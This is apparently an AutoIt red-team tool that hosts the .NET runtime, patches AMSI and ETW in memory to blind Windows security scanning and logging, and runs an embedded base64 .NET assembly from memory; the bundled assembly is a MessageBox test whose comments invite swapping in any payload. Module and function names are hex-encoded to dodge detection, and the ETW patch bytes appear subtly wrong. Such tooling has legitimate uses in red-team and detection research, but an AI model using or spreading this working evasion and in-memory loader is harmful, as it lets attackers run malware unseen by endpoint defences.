#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_UseX64=y
#AutoIt3Wrapper_Change2CUI=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

#include ".\Includes\SafeArray.au3"
#include ".\Includes\Variant.au3"
#include ".\Includes\CLRConsts.au3"
#include <WinAPIRes.au3>
#include <WinAPISys.au3>
#include <Memory.au3>
#include <String.au3>

#cs --------------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         VIVI (https://github.com/V1V1) | (https://twitter.com/_theVIVI)

 Script Function:
	Hosts the CLR, patches AMSI & ETW and executes a .NET assembly from memory.

 Notes:
    This is a modified version of a script by Danyfirex (https://www.autoitscript.com/forum/profile/71248-danyfirex/)
    All credit goes to them for their amazing work.

    I'm trying to figure out how to pass arguments to the assembly at execution.
    For now, it doesn't work.

 Reference:
    https://www.autoitscript.com/forum/topic/188158-net-common-language-runtime-clr-framework/

#ce --------------------------------------------------------------------------------

; Title
ConsoleWrite(@CRLF & "=========== ExecuteAssembly-v1 (no args) ===========" & @CRLF & @CRLF)

;~ Run .NET assembly
_Run_dotNET_Assembly()

#cs ----------------------------------------------------------------------------

Main functions:
    _Run_dotNET_Assembly()
    _PatchAMSI()
    _PatchETW()
    _Base64String()

#ce ----------------------------------------------------------------------------

Opt("MustDeclareVars", 1)

Func _Run_dotNET_Assembly()

    Local $hMSCorEE = DllOpen("MSCorEE.DLL")
    Local $aRet = DllCall($hMSCorEE, "long", "CLRCreateInstance", "struct*", $tCLSID_CLRMetaHost, "struct*", $tIID_ICLRMetaHost, "ptr*", 0)

    If $aRet[0] = $S_OK Then
        Local $pClrHost = $aRet[3]
        Local $oClrHost = ObjCreateInterface($pClrHost, $sIID_ICLRMetaHost, $sTag_CLRMetaHost)

        #Region Get EnumerateRuntimes
        Local $tEnumerateRuntimes = DllStructCreate("ptr")
        $oClrHost.EnumerateInstalledRuntimes(DllStructGetPtr($tEnumerateRuntimes))
        Local $pEnumerateRuntimes = DllStructGetData($tEnumerateRuntimes, 1)

        Local $oEnumerateRuntimes = ObjCreateInterface($pEnumerateRuntimes, $sIID_IEnumUnknown, $sTagEnumUnknown)

        Local $sNETFrameworkVersion = "v4.0.30319"
        Local $tCLRRuntimeInfo = DllStructCreate("ptr")

        $oClrHost.GetRuntime($sNETFrameworkVersion, $tIID_ICLRRuntimeInfo, DllStructGetPtr($tCLRRuntimeInfo))
        Local $pCLRRuntimeInfo = DllStructGetData($tCLRRuntimeInfo, 1)

        Local $oCLRRuntimeInfo = ObjCreateInterface($pCLRRuntimeInfo, $sIID_ICLRRuntimeInfo, $sTag_CLRRuntimeInfo)
        Local $isIsLoadable = 0
        $oCLRRuntimeInfo.IsLoadable($isIsLoadable)

        If $isIsLoadable Then
            Local $tCLRRuntimeHost = DllStructCreate("ptr")
            $oCLRRuntimeInfo.GetInterface(DllStructGetPtr($tCLSID_CLRRuntimeHost), DllStructGetPtr($tIID_ICLRRuntimeHost), DllStructGetPtr($tCLRRuntimeHost))
            Local $pCLRRuntimeHost = DllStructGetData($tCLRRuntimeHost, 1)
            Local $oCLRRuntimeHost = ObjCreateInterface($pCLRRuntimeHost, $sIID_ICLRRuntimeHost, $sTag_CLRRuntimeHost)

            $oCLRRuntimeHost.Start()

            Local $tCorRuntimeHost = DllStructCreate("ptr")
            $oCLRRuntimeInfo.GetInterface(DllStructGetPtr($tCLSID_CorRuntimeHost), DllStructGetPtr($tIID_ICorRuntimeHost), DllStructGetPtr($tCorRuntimeHost))
            Local $pCorRuntimeHost = DllStructGetData($tCorRuntimeHost, 1)

            Local $oCorRuntimeHost = ObjCreateInterface($pCorRuntimeHost, $sIID_ICorRuntimeHost, $sTag_ICorRuntimeHost)

            $oCorRuntimeHost.Start()

            Local $pAppDomain = 0
            $oCorRuntimeHost.GetDefaultDomain($pAppDomain)
            Local $oAppDomain = ObjCreateInterface($pAppDomain, $sIID_AppDomain, $sTag_AppDomain)

            Local $bBinaryNetExe = _Base64String()
            Local $iSize = BinaryLen($bBinaryNetExe)
            Local $tBuffer = DllStructCreate("byte[" & $iSize & "]")
            DllStructSetData($tBuffer, 1, $bBinaryNetExe)

            Local $tSafeArrayBound = DllStructCreate($tagSAFEARRAYBOUND)
            Local $pSafeArray, $pSafeArrayData
            DllStructSetData($tSafeArrayBound, "cElements", $iSize)
            DllStructSetData($tSafeArrayBound, "lLbound", 0)
            $pSafeArray = SafeArrayCreate($VT_UI1, 1, $tSafeArrayBound)
            SafeArrayAccessData($pSafeArray, $pSafeArrayData)
            _MemMoveMemory(DllStructGetPtr($tBuffer), $pSafeArrayData, $iSize)
            SafeArrayUnaccessData($pSafeArray)

            ; Execute assembly
            ConsoleWrite("[*] Executing .NET assembly" & @CRLF & @CRLF)

            Local $pAssembly = 0
            Local $pExeArray = $pSafeArray
            $oAppDomain.Load_3($pExeArray, $pAssembly)

            Local $oAssembly = ObjCreateInterface($pAssembly, $sIID_IAssembly, $sTag_IAssembly)
            Local $sFullName = ""
            $oAssembly.get_FullName($sFullName)
            ConsoleWrite("  [i] Assembly name: " & $sFullName & @CRLF & @CRLF)

            Local $pSAEmpty, $tSAB = DllStructCreate($tagSAFEARRAYBOUND)
            DllStructSetData($tSAB, "cElements", 1)
            DllStructSetData($tSAB, "lLbound", 0)
            $pSAEmpty = SafeArrayCreate($VT_VARIANT, 1, $tSAB)

            Local $pMethodInfo = 0
            $oAssembly.get_EntryPoint($pMethodInfo)
            Local $oMethodInfo = ObjCreateInterface($pMethodInfo, $sIID_MethodInfo, $sTag_IMethodInfo)
            $oMethodInfo.Name($sFullName)

            Local $pRet = 0
            $oMethodInfo.Invoke_3(Null, $pSAEmpty, $pRet)

            SafeArrayDestroy($pSAEmpty) ;free
            SafeArrayDestroy($pSafeArray) ;free

            ConsoleWrite(@CRLF & @CRLF & "[+] Done." & @CRLF & @CRLF)

        EndIf

    EndIf

    DllClose($hMSCorEE) ;free

EndFunc

Func _PatchETW()
    ; Adapted from - https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
    ; Credits - Adam Chester (https://twitter.com/_xpn_)

    ConsoleWrite("[*] Patching ETW" & @CRLF & @CRLF)

    ; Define patch bytes - specifically for 64 bit process
    Local $patchBytes = "0x30786333"

    ; Get EtwEventWrite location
    Local $ndllStr = _HexToString("0x6e74646c6c2e646c6c")
    Local $ntdll = _WinAPI_LoadLibrary($ndllStr)
    If $ntdll = 0 Then
        ConsoleWrite("[X] Couldn't load DLL." & @CRLF & @CRLF)
        Exit
    EndIf

    ; Get EtwEventWrite address
    Local $etwEWStr = _HexToString("0x4574774576656e745772697465")
    Local $etwEW = _WinAPI_GetProcAddress($ntdll, $etwEWStr)

    If $etwEW = 0 Then
        ConsoleWrite("[X] Failed to get EtwEventWrite address." & @CRLF & @CRLF)
        Exit
    EndIf

    ; Make memory region writable

    ; Patch length
    Local $patchSize = BinaryLen($patchBytes)

    ; VirtualProtect
    Local $vpCall = DllCall("Kernel32.dll", "int", "VirtualProtect", _
        "ptr", $etwEW, _
        "long", $patchSize, _
        "dword", 0x40, _
        "dword*", 0)

    Local $hProtect = $vpCall[0]
    Local $oldProtect = $vpCall[4]

    ;~ Byte array to the address
    Local $patchBuffer = DllStructCreate("byte[" & $patchSize & "]", $etwEW)
    ;~ Copy patch
    DllStructSetData($patchBuffer, 1, $patchBytes)

    ; Restore region to RX
    Local $resCall = DllCall("Kernel32.dll", "int", "VirtualProtect", _
        "ptr", $etwEW, _
        "long", $patchSize, _
        "dword", $oldProtect, _
        "dword*", 0)

    ConsoleWrite("  [+] ETW patch successful" & @CRLF & @CRLF)

EndFunc ;==>_PatchETW()

Func _PatchAMSI()
    ; Adapted from - https://gist.github.com/FatRodzianko/c8a76537b5a87b850c7d158728717998
    ; Credits - FatRodzianko (https://github.com/FatRodzianko)
    ; Initial bypass technique discovered by Rastamouse (https://twitter.com/_RastaMouse)

    ConsoleWrite("[*] Patching AMSI" & @CRLF & @CRLF)

    ; Define patch bytes - specifically for 64 bit process
    Local $patchBytes = "0x31C0057801197F05DFFEED00C3"

    ; Get ASB location
    Local $adll = _HexToString("0x616d73692e646c6c")
    Local $amLib = _WinAPI_LoadLibrary($adll)
    If $amLib = 0 Then
        ConsoleWrite("[X] Couldn't load DLL." & @CRLF & @CRLF)
        Exit
    EndIf

    ; Get ASB address
    Local $asb = _HexToString("0x416d73695363616e427566666572")
    Local $asbLoc = _WinAPI_GetProcAddress($amLib, $asb)

    If $asbLoc = 0 Then
        ConsoleWrite("[X] Failed to get ASB memory address." & @CRLF & @CRLF)
        Exit
    EndIf

    ; Patch length
    Local $patchSize = BinaryLen($patchBytes)

    ; VirtualProtect - make memory region writable
    Local $vpCall = DllCall("Kernel32.dll", "int", "VirtualProtect", _
        "ptr", $asbLoc, _
        "long", $patchSize, _
        "dword", 0x40, _
        "dword*", 0)

    Local $hProtect = $vpCall[0]
    Local $oldProtect = $vpCall[4]

    ;~ Byte array to the address
    Local $patchBuffer = DllStructCreate("byte[" & $patchSize & "]", $asbLoc)
    ;~ Copy patch
    DllStructSetData($patchBuffer, 1, $patchBytes)

    ; Restore region to RX
    Local $resCall = DllCall("Kernel32.dll", "int", "VirtualProtect", _
        "ptr", $asbLoc, _
        "long", $patchSize, _
        "dword", $oldProtect, _
        "dword*", 0)

    ConsoleWrite("  [+] AMSI patch successful" & @CRLF & @CRLF)

EndFunc ;==>_PatchAMSI()

; Code below was adapted from: 'File to Base64 String' Code Generator v1.20 Build 2020-06-05
; Credits - UEZ (https://www.autoitscript.com/forum/profile/29844-uez/)
; NOTE: Setting $bSaveBinary to True will write the assembly to disk, you probably want to avoid this
Func _Base64String($bSaveBinary = False, $sSavePath = @ScriptDir)

    ; Base64 assembly
    Local $Base64Assembly

    ; Assembly below is a simple MessageBox
    ; Replace the lines below with your own Base64 encoded .NET assembly
    ; Use this script for conversion - https://gist.github.com/V1V1/b3a3315a90817fef8fa0f45334e2e196
    $Base64Assembly &= 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAbGXf0AAAAAAAAAAOAAIgALATAAAAgAAAAIAAAAAAAA8icAAAAgAAAAQAAAAABAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAACAAAAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAKAnAABPAAAAAEAAANwFAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAADcJgAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA+AcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAANwFAAAAQAAAAAYAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAEAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAADUJwAAAAAAAEgAAAACAAUAcCAAAGwGAAADAAIAAgAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF5+DwAACnIBAABwci8AAHAWKAEAAAYmKh4CKBAAAAoqQlNKQgEAAQAAAAAADAAAAHY0LjAuMzAzMTkAAAAABQBsAAAABAIAACN+AABwAgAAjAIAACNTdHJpbmdzAAAAAPwEAABIAAAAI1VTAEQFAAAQAAAAI0dVSUQAAABUBQAAGAEAACNCbG9iAAAAAAAAAAIAAAFHFQAUCQAAAAD6'
$Base64Assembly &= 'ATMAFgAAAQAAABEAAAACAAAAAwAAAAUAAAAQAAAADgAAAAEAAAABAAAAAQAAAAEAAAAAAIMBAQAAAAAABgD4AC8CBgBlAS8CBgAsAP0BDwBPAgAABgBUAM8BBgDbAM8BBgC8AM8BBgBMAc8BBgAYAc8BBgAxAc8BBgBrAM8BBgBAABACBgAeABACBgCfAM8BBgCGAJYBBgBjAsMBBgD2AcMBAAAAAAEAAAAAAAEAAQAAABAAuwFqAkEAAQABAAAAAACAAJEggAImAAEAUCAAAAAAlgDKAS4ABQBoIAAAAACGGPABBgAGAAAAAQATAAAAAgB5AgAAAwDhAQAABAAYAAAAAQBeAgkA8AEBABEA8AEGABkA8AEKACkA8AEQADEA8AEQADkA8AEQAEEA8AEQAEkA8AEQAFEA8AEQAFkA8AEQAGEA8AEVAGkA8AEQAHEA8AEQAHkA8AEQAIkA6wEaAIEA8AEGAC4ACwA0AC4AEwA9AC4AGwBcAC4AIwBlAC4AKwB5AC4AMwB5AC4AOwB5AC4AQwBlAC4ASwB/AC4AUwB5AC4AWwB5AC4AYwCXAC4AawDBAC4AcwDOALABRAEDAIACAQAEgAAAAQAAAAAAAAAAAAAAAABqAgAABAAAAAAAAAAAAAAAHQAKAAAAAAAAAAAAADxNb2R1bGU+AG1zY29ybGliAGhXbmQAdVR5cGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBUYXJnZXRGcmFtZXdvcmtBdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBBc3NlbWJseUNvbmZpZ3VyYXRpb25BdHRyaWJ1dGUAQXNzZW1ibHlEZXNjcmlwdGlvbkF0dHJpYnV0ZQBDb21w'
$Base64Assembly &= 'aWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAEFzc2VtYmx5UHJvZHVjdEF0dHJpYnV0ZQBBc3NlbWJseUNvcHlyaWdodEF0dHJpYnV0ZQBBc3NlbWJseUNvbXBhbnlBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUATWVzc2FnZUJveFRlc3QuZXhlAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAdXNlcjMyLmRsbABQcm9ncmFtAFN5c3RlbQBNYWluAFN5c3RlbS5SZWZsZWN0aW9uAGxwQ2FwdGlvbgBaZXJvAC5jdG9yAEludFB0cgBTeXN0ZW0uRGlhZ25vc3RpY3MAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAYXJncwBPYmplY3QATWVzc2FnZUJveFRlc3QAbHBUZXh0AE1lc3NhZ2VCb3gAAAAtRwByAGUAZQB0AGkAbgBnAHMAIABmAHIAbwBtACAALgBOAEUAVAAgADoAKQAAFUgAZQB5ACAAdABoAGUAcgBlACEAAAAAAGNsYQzBD1FNswu68qXi9QsABCABAQgDIAABBSABARERBCABAQ4EIAEBAgIGGAi3elxWGTTgiQcABAgYDg4JBQABAR0OCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAIAAAAAABMBAA5NZXNzYWdlQm94VGVzdAAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAyMQAAKQEAJDI1MjQ5NDU1LWJiZmItNDVhYy05M2YyLTRiZGQ5OTUwZDE4MwAADAEABzEuMC4wLjAAAEkBABouTkVURnJhbWV3b3JrLFZlcnNpb249djQuNQEAVA4URnJhbWV3b3JrRGlzcGxheU5hbWUS'
$Base64Assembly &= 'Lk5FVCBGcmFtZXdvcmsgNC41AAAAAFXmrYwAAAAAAgAAAIwAAAAUJwAAFAkAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RT6eqU47irBEW4KJiwMxko9QEAAABDOlxSZWFwZXJcUGVldmVzXEF1dG9JdFxBdXRvSXQtUmVwb1xUcmFkZWNyYWZ0XFZTLVJlcG9cTWVzc2FnZUJveFRlc3RcTWVzc2FnZUJveFRlc3Rcb2JqXFJlbGVhc2VcTWVzc2FnZUJveFRlc3QucGRiAMgnAAAAAAAAAAAAAOInAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADUJwAAAAAAAAAAAAAAAF9Db3JFeGVNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAQAAAAIAAAgBgAAABQAACAAAAAAAAAAAAAAAAAAAABAAEAAAA4AACAAAAAAAAAAAAAAAAAAAABAAAAAACAAAAAAAAAAAAAAAAAAAAAAAABAAEAAABoAACAAAAAAAAAAAAAAAAAAAABAAAAAADcAwAAkEAAAEwDAAAAAAAAAAAAAEwDNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAQAAAAAAAAABAAAAAAA/AAAAAAAAAAQAAAABAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsASsAgAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAACIAgAAAQAwADAAMAAwADAANABiADAAAAAaAAEAAQBDAG8AbQBtAGUAbgB0AHMAAAAAAAAAIgABAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAAAAAAAARgAPAAEARgBpAGwA'
$Base64Assembly &= 'ZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAAE0AZQBzAHMAYQBnAGUAQgBvAHgAVABlAHMAdAAAAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAARgATAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABNAGUAcwBzAGEAZwBlAEIAbwB4AFQAZQBzAHQALgBlAHgAZQAAAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMgAxAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABOABMAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAATQBlAHMAcwBhAGcAZQBCAG8AeABUAGUAcwB0AC4AZQB4AGUAAAAAAD4ADwABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAATQBlAHMAcwBhAGcAZQBCAG8AeABUAGUAcwB0AAAAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAADsQwAA6gEAAAAAAAAAAAAA77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI/Pg0KDQo8YXNzZW1ibHkgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxIiBtYW5pZmVzdFZlcnNpb249IjEuMCI+DQogIDxhc3NlbWJseUlkZW50aXR5IHZlcnNpb249IjEuMC4wLjAiIG5hbWU9Ik15QXBw'
$Base64Assembly &= 'bGljYXRpb24uYXBwIi8+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYyIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjMiPg0KICAgICAgICA8cmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwgbGV2ZWw9ImFzSW52b2tlciIgdWlBY2Nlc3M9ImZhbHNlIi8+DQogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5PgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAA9DcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
$Base64Assembly &= 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

	; Patch AMSI & ETW before decoding our assenbly
    _PatchAMSI()
    _PatchETW()

    ; Decode assembly
    Local $bString = _WinAPI_Base64Decode($Base64Assembly)
	If @error Then Return SetError(1, 0, 0)
	$bString = Binary($bString)
	If $bSaveBinary Then
		Local Const $hFile = FileOpen($sSavePath & "\decodedB64Assembly.exe", 18)
		If @error Then Return SetError(2, 0, $bString)
		FileWrite($hFile, $bString)
		FileClose($hFile)
	EndIf

	Return $bString
EndFunc   ;==>_Base64String()

#cs ----------------------------------------------------------------------------

Util functions:
    _WinAPI_Base64Decode()

#ce ----------------------------------------------------------------------------

Func _WinAPI_Base64Decode($sB64String)

	Local $aCrypt = DllCall("Crypt32.dll", "bool", "CryptStringToBinaryA", "str", $sB64String, "dword", 0, "dword", 1, "ptr", 0, "dword*", 0, "ptr", 0, "ptr", 0)
	If @error Or Not $aCrypt[0] Then Return SetError(1, 0, "")
	Local $bBuffer = DllStructCreate("byte[" & $aCrypt[5] & "]")
	$aCrypt = DllCall("Crypt32.dll", "bool", "CryptStringToBinaryA", "str", $sB64String, "dword", 0, "dword", 1, "struct*", $bBuffer, "dword*", $aCrypt[5], "ptr", 0, "ptr", 0)
	If @error Or Not $aCrypt[0] Then Return SetError(2, 0, "")
	Return DllStructGetData($bBuffer, 1)

EndFunc   ;==>_WinAPI_Base64Decode()
